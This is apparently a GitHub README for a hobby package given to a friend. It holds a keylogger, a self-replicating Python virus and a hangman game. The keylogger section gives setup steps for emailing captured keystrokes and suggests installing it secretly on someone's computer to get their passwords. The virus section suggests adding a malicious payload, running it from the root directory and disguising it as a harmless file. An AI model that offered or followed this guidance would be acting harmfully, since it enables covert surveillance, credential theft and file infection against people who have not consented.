# Installation

-------------------------------------------------------
git clone https://github.com/God-status/CfBM-NChygN.git
-------------------------------------------------------

Hey there, Nick! This is a little package for you to have some fun with. It consists of a key logger, a virus, hangman, and some examples. 


				 Key Logger
-----------------------------------------------------------------------------
The key logger records everything you type and sends it in 50 character packages to your email. Obviously this would be most useful if you installed and ran this secretly on someones computer. You could see what they look up, their passwords maybe, and so on. To use it, just follow these three simple steps:

1. Go into the code of the file called 'key-logger.py' and change the email variable (line 18) and the password variable (line 19) to the email and password respectively, that you want the emails to be sent to. Make sure your password and email address are correct, or you'll get an error message.
NOTE: Remember to save the file to update the code!

2. Next, go to your command prompt, cd into Catalan, and install the requirements. Just type 'pip3 install -r requirements.txt' into the command prompt (inside the Catalan dir') and hit enter.
NOTE: I'm assuming you have pip installed. Iff you don't, look it up. It makes downloading python stuff a million times easier. You can download any python module in the pypi list with it.

3. Make sure you have the 'enable for less secure apps' setting turned on in your google account, or you'll get an error message. Just google the setting if you can't find it.

And there you go! It's all set up! Just cd into the Catalan DIR and type in 'python3 key-logger.py' and it should work fine. Just keep the program running and type some stuff. Make sure you type at least 50 characters before you check your email, or it won't have sent an email yet. Enjoy!

-----------------------------------------------------------------------------


				   Virus
-----------------------------------------------------------------------------
The virus is a very simple, self-replicating virus. Once run, it infects all other files stored in its DIR. No setup is required, just run it by, again, cd'ing into Catalan and typing 'python3 virus.py' into the command prompt. Look inside the code of hello-clean.py. It should just be one line. Now open up hello-infected.py and look at the code. Notice the code between ##### Virus Start ##### and ##### Virus End #####. Now run hello-clean.py and notice it prints an extra line. See inside the code again and notice, that the virus has infected it. If you want, you can change the payload of the virus in the virus.py file. Just change the code under '#Payload' to whatever you want. This could be really dangerous if the payload was malicious, or if you stored this python file in the root directory, giving it access to every file on your computer, save USB drives and such. And remember this could be disguised as another file and you can change the name to whatever you want as long as it ends with '.py'. (E.g. fun_game.py). Something to think about.

-----------------------------------------------------------------------------


				  Hangman
-----------------------------------------------------------------------------
This last part is exactly what it sounds like: A python version of python! Just cd into Catalan, and type 'python3 hangman.py' into the CMD and it should fire up! Enjoy! 


I hope this little package I made for you proves fun and informative, have fun! 
